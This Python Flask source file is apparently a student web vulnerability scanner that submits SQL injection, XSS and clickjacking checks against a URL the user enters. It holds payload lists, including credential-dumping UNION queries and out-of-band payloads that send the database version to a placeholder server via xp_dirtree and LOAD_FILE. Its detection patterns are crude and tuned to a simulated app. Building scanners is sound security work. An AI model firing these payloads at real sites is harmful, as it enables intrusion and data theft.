from flask import Flask, render_template, request, jsonify
from bs4 import BeautifulSoup
from threading import Thread, Lock
import sys
from urllib.parse import urljoin
from time import sleep
import requests
import re
import time
import logging
from flask import Flask, render_template, request, redirect, url_for, session
from queue import Queue

# Initialize logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

app = Flask(__name__, template_folder='C:/Users/Computing/OneDrive - University of Lincoln/project/templates')

# Initialize a lock and a list to hold scan results
scan_results_lock = Lock()
scan_results = []
# payloads.py

# Error-based SQL Injection Payloads
error_based_payloads = [
    "' OR '1'='1",
    # ... more payloads ...
]

# Blind SQL Injection Payloads
blind_payloads = [
    "' AND 1=1 -- ",
    # ... more payloads ...
]

time_based_payloads = [
    "'; IF (1=1) WAITFOR DELAY '0:0:5' --",
    "'; SELECT SLEEP(5) --",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))bKbj) AND '1'='1",
    "1; SELECT pg_sleep(5); --",
    # ... more payloads ...
]

out_of_band_payloads = [
    "'; DECLARE @q NVARCHAR(200); SET @q = '\\\\YOUR_SERVER\\share\\' + (SELECT @@version); EXEC master..xp_dirtree @q; -- ",
    "' UNION SELECT LOAD_FILE(concat('\\\\',(SELECT @@version),'\\test\\yourdomain.com\\')) -- ",
    # ... more payloads ...
]

union_based_payloads = [
    "' UNION SELECT NULL, username, password FROM users-- ",
    "' UNION SELECT 1, @@version --",
    "1' UNION SELECT 1,2,3,4,table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 -- ",
    # ... more payloads ...
]


# XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    
    "<img src=x onerror=alert('XSS')>",
    
    "'\"><script>alert('XSS')</script>",
    # ... more payloads ...
]



def create_vulnerability_report(vuln_type, url, details):
   
    report = {
        'vulnerability': vuln_type,  # Type of the vulnerability
        'url': url,                  # URL where the vulnerability was found
        'details': details,          # Detailed information about the vulnerability
        'recommendation': get_recommendation(vuln_type)  # Recommendations for remediation
    }
    return report

def get_recommendation(vuln_type):
    
    recommendations = {
        'SQL Injection': 'Use parameterized queries and prepared statements. Validate and sanitize all user inputs.',
        'XSS': 'Implement content security policies. Validate and sanitize user inputs and outputs.',
        'Clickjacking': 'Set X-Frame-Options header to DENY or SAMEORIGIN. Implement frame-busting scripts.'
    }
    # Retrieve recommendation based on the vulnerability type, with a default message if not found
    return recommendations.get(vuln_type, 'No specific recommendation available.')



payloads = error_based_payloads + blind_payloads + time_based_payloads + out_of_band_payloads + union_based_payloads
# Loop over these payloads in your scanner logic
def get_forms(url, s):
     # Make a GET request to the specified URL using the provided session object
    response = s.get(url)
      # Parse the HTML content of the response using BeautifulSoup
    soup = BeautifulSoup(response.content, "html.parser")
       # Find all form elements in the parsed HTML and return them as a list
    return soup.find_all("form")
def form_details(form):
   # Initialize a dictionary to store details of the form
    detailsOfForm = {}
    # Retrieve the 'action' attribute from the form, specifying where the form data should be submitted
    action = form.attrs.get("action")
    # Retrieve the 'method' attribute from the form, specifying the HTTP method (GET or POST)
    method = form.attrs.get("method", "get")  # Default to 'get' if 'method' is not specified
    # Initialize a list to store details of each input field within the form
    inputs = []
    
    # Iterate over each input tag within the form
    for input_tag in form.find_all("input"):
        # Retrieve the 'name' attribute, which is key for processing the input on the server
        input_name = input_tag.attrs.get("name")
        if input_name:  # Ensure the input has a 'name' attribute
            # Retrieve the 'type' attribute, defaulting to "text" if not specified
            input_type = input_tag.attrs.get("type", "text")
            # Retrieve the 'value' attribute, defaulting to an empty string if not specified
            input_value = input_tag.attrs.get("value", "")
            # Append a dictionary with details of the input to the inputs list
            inputs.append({
                "type": input_type,
                "name": input_name,
                "value": input_value
            })
    
     # Add the extracted details to the detailsOfForm dictionary
    detailsOfForm['action'] = action
    detailsOfForm['method'] = method
    detailsOfForm['inputs'] = inputs
    # Return the dictionary containing all the details of the form
    return detailsOfForm

def vulnerable(response):
    error_patterns = [
        # General SQL Error Patterns
        r"you have an error in your sql syntax",
        r"sql syntax.*mysql",
        r"ora-\d{5}",  # Oracle errors
        r"invalid query",
        r"unknown column",
        r"sql server error",
        r"odbc microsoft access driver",

        # Database-specific Error Patterns
        r"postgresql.*error",
        r"warning.* \bmysql\b",
        r"microsoft.*sql.*server.*driver",
        r"sqlite_exception",
        r"jdbc error",
        r"t-sql error",

        # Custom Messages for Simulated SQL Injections
        r"Delayed response",  # Time-based SQL Injection
        r"Extra data retrieved",  # Union-based SQL Injection
        r"Blind SQL Injection detected",  # Blind SQL Injection
        r"Out-of-band SQL Injection detected",  # Out-of-band SQL Injection
        r"Error executing command",  # Custom error for execution SQL Injection
        r"unexpected end of command in statement",  # Custom syntax error

        # Additional Common SQL Injection Indicators
        r"syntax error at or near",
        r"divided by zero error", 
        r"SQL Injection Detected",  # Custom message for detected SQL injections
        r"You have an error in your SQL syntax",  # Custom error message for syntax errors
        r"Login failed. Incorrect username or password.",  # Custom message for login failure
        r"Logged in successfully!",  # Custom success message indicating potential injection
        r"Received blind test param:",
        r"Received out of band test param:",
        r"Results for query:",
        r"Delayed response due to query",
        r"Extra data retrieved for query",
        r"No blind SQL injection detected",
        r"Query processed",
        r"Out-of-band test query executed",
        r"SLEEP",
        r"UNION",
        r"AND",
        r"OR",
        r"EXEC",
        r"xp_cmdshell",
        r"sql syntax error",  # Error-Based SQL Injection
        r"logged in successfully! \(blind sql injection\)",  # Blind SQL Injection
        r"logged in successfully! \(time-based sql injection\)",  # Time-Based SQL Injection
        r"external command executed",  # Out-of-Band SQL Injection
        r"username: admin, password: pass123",  
        r"username: user, password: userpass",
        r"union select",  # Union-based SQL Injection
        r"or '1'='1'",
        
    
    ]

    response_text = response.content.decode().lower()
    for pattern in error_patterns:
        if re.search(pattern, response_text):
            return True
    return False

def detect_injection_type(response):
    # Get the response text and convert it to lowercase to ensure consistent matching
    response_text = response.content.decode().lower()

    # Define patterns that match the simulated responses in your test application
    patterns = {
        "Error-Based": [
            "sql syntax error: incorrect sql query",  # This matches the error response in the test application
        ],
        "Time-Based": [
            "time delay detected - potential sql injection",  # This matches the time-based simulated response
        ],
        "Union-Based": [
            "admin, password: pass123",  # This part should be unique enough to match the union response
            "user, password: userpass",  # Adjust according to your test application's responses
        ],
        "Blind/Time-Based/Out-of-Band": [
            "out-of-band interaction detected - potential sql injection",  # This matches the out-of-band simulated response
        ],
    }

    # Check for each type of SQL injection
    for injection_type, type_patterns in patterns.items():
        for pattern in type_patterns:
            if re.search(pattern, response_text):
                logging.info(f"Detected {injection_type} with pattern '{pattern}'")
                return injection_type

    # If no patterns matched, it's either an unknown type or not an SQL injection
    return "Unknown or No SQL Injection Detected"
    
@app.route('/')
def index():
    return render_template('webscanner.html')

SIMULATED_DB = {
    'admin': 'password123',
    'user1': 'password456',
    'user2': 'password789'
}









def test_login_with_payloads(url, s):
    vulnerabilities = []
    login_url = urljoin(url, '/login')

    # Creating an iterator for the payloads
    payload_iterator = iter(payloads)

    # Loop through each user in the simulated database
    for username, password in SIMULATED_DB.items():
        # Get the next payload for the current user, cycle back to the start if we run out
        try:
            payload = next(payload_iterator)
        except StopIteration:
            payload_iterator = iter(payloads)
            payload = next(payload_iterator)

        # Preparing data with the selected payload
        data = {'username': payload, 'password': password}
        response = s.post(login_url, data=data)

        detected_type = detect_injection_type(response)
        if detected_type != "Unknown or No SQL Injection Detected":
            print(f"[!] {detected_type} SQL injection vulnerability detected with payload '{payload}' for user {username}")
            vulnerabilities.append({
                'url': login_url,
                'username': username,
                'payload': payload,
                'response': response.text,
                'type': detected_type
            })

    return vulnerabilities

def perform_scans(url_to_scan):
  
    # Create a session to maintain persistent parameters across requests
    with requests.Session() as s:
        s.headers["User-Agent"] = "Mozilla/5.0 ..."  # Set a user-agent to simulate a browser request

        # Perform SQL Injection scan and store results
        sql_injection_vulnerabilities = perform_sql_injection_scan(url_to_scan, s)
        
        # Perform XSS scan and store results
        xss_vulnerabilities = perform_xss_scan(url_to_scan, s)
        
        # Perform Clickjacking scan and store results
        clickjacking_report = perform_clickjacking_scan(url_to_scan, s)

        # Combine all detected vulnerabilities into a single list
        vulnerabilities = sql_injection_vulnerabilities + xss_vulnerabilities
        if clickjacking_report:
            vulnerabilities.append(clickjacking_report)  # Include clickjacking if found

        # Store the results in a thread-safe manner using a lock
        with scan_results_lock:
            scan_results.extend(vulnerabilities)


@app.route('/scan', methods=['POST'])
def scan():
    url_to_scan = request.form.get('url')  # Retrieves the URL to scan from the form submitted by the user.
    if not url_to_scan:
        # If no URL is provided, return the main scanner page with an error message prompting for a URL.
        return render_template('webscanner.html', error='Please enter a URL to scan.')
    
    # Start the scan in a new thread to allow the web service to continue responding to other requests.
    thread = Thread(target=perform_scans, args=(url_to_scan,))
    thread.start()
    
    # Immediately return the scanning page to inform the user that scanning is in progress.
    return render_template('scanningpage.html', url_to_scan=url_to_scan)

# Results queue - this is intended for use in a different or removed part of the code; not used in the provided snippet.
results_queue = Queue()

@app.route('/results')
def show_results():
    # Fetch the results in a thread-safe manner
    with scan_results_lock:
        # Retrieves the vulnerabilities found during the scan and clears the list for the next scan.
        vulnerabilities = list(scan_results)
        scan_results.clear()
    
    # Renders a page to display the scan results using the vulnerabilities data.
    return render_template('scan.results.html', vulnerabilities=vulnerabilities)
 
    



def construct_data(form_details, payload):
    # Initialize an empty dictionary for form data
    data = {}

    # Iterate over the inputs in the form
    for input_field in form_details["inputs"]:
        # Check if the input field is 'username'
        if input_field["name"] == "username":
            # Assign the payload to the 'username' field
            data[input_field["name"]] = payload
        else:
            # For other fields, use their default values
            data[input_field["name"]] = input_field["value"]
    
    # Return the constructed form data
    return data
def perform_sql_injection_scan(url, s):
    # Retrieve all forms from the given URL using the Beautiful Soup library for parsing HTML
    forms = get_forms(url, s)
    vulnerabilities = []  # Initialize a list to keep track of detected vulnerabilities
    
    # Iterate through each form found on the page
    for form in forms:
        # Extract details from the form, including action, method, and input fields
        details = form_details(form)
        
        # Iterate over each predefined payload intended for testing SQL injection
        for payload in payloads:
            # Construct data dictionary with inputs from the form, injecting the SQL payloads
            data = construct_data(details, payload)
            # Construct the full URL to which the form data should be submitted
            full_url = urljoin(url, details['action'])
            
            # Send the request based on the form method (GET or POST) with injected payload
            response = s.post(full_url, data=data) if details["method"].lower() == "post" else s.get(full_url, params=data)
            
            # Analyze the response to determine if a SQL injection vulnerability was detected
            detected_type = detect_injection_type(response)
            if detected_type != "Unknown or No SQL Injection Detected":
                # If a vulnerability is found, create a detailed report
                report = create_vulnerability_report(detected_type, full_url, f"Detected with payload '{payload}'")
                # Add the report to the list of vulnerabilities
                vulnerabilities.append(report)

    # Return the list of vulnerabilities found during the scan
    return vulnerabilities





def perform_xss_scan(url, s):
    
   
    vulnerabilities = []  # List to store all discovered vulnerabilities

    # Retrieve all forms from the page at the specified URL
    forms = get_forms(url, s)
    # Iterate over each form to test XSS injections
    for form in forms:
        details = form_details(form)  # Extract details from the form
        # Iterate over each XSS payload
        for payload in xss_payloads:
            # Prepare data dict to send with the request, injecting the payload into all input fields except password types
            data = {input_field["name"]: payload if input_field["type"] != "password" else "password" 
                    for input_field in details["inputs"]}
            # Construct the full URL to which the form should be submitted
            full_url = urljoin(url, details['action'])
            # Send the request based on the form's method and check if the payload appears in the response text
            response = s.post(full_url, data=data) if details["method"].lower() == "post" else s.get(full_url, params=data)
            if payload in response.text:
                print(f"[!] Potential XSS in form detected with payload '{payload}' at {full_url}")
                # Create and append a vulnerability report if the payload is found in the response
                report = create_vulnerability_report('XSS', full_url, f"Detected with payload '{payload}'")
                vulnerabilities.append(report)

    # Additionally test for reflected XSS via query parameters
    test_endpoint = '/test-xss'  # Endpoint specifically set up to reflect parameters
    for payload in xss_payloads:
        # Send the payload as a query parameter
        response = s.get(urljoin(url, test_endpoint), params={"input": payload})
        if payload in response.text:
            print(f"[!] Potential XSS in query parameter detected with payload '{payload}' at {urljoin(url, test_endpoint)}")
            # Create and append a vulnerability report if the payload is found in the response
            report = create_vulnerability_report('XSS', urljoin(url, test_endpoint), f"Detected with payload '{payload}'")
            vulnerabilities.append(report)

    return vulnerabilities



def perform_clickjacking_scan(url, s):
    try:
        # Send a GET request to the specified URL to fetch headers
        response = s.get(url)
        # Extract the 'X-Frame-Options' header and convert it to lowercase
        x_frame_options = response.headers.get('X-Frame-Options', '').lower()
        
        # Check if the X-Frame-Options header is set correctly to prevent clickjacking
        if not x_frame_options or x_frame_options not in ['deny', 'sameorigin']:
            # If the header is not set or set incorrectly, log a potential vulnerability
            print(f"[!] Potential Clickjacking vulnerability detected at {url}")
            # Create a vulnerability report indicating the issue with the X-Frame-Options header
            report = create_vulnerability_report('Clickjacking', url, 'X-Frame-Options header missing or misconfigured')
            return report
        else:
            # If the header is set correctly, return None indicating no vulnerability
            return None
    except Exception as e:
        # Log any errors encountered during the scan
        print(f"Error scanning {url} for clickjacking: {e}")
        return None



    
    

def is_time_delayed(response_time, baseline_time, threshold=5):
    """Checks if the response time is at least `threshold` seconds more than the baseline."""
    return response_time - baseline_time > threshold
   
if __name__ == '__main__':
    app.run(debug=True,port=5001)


    

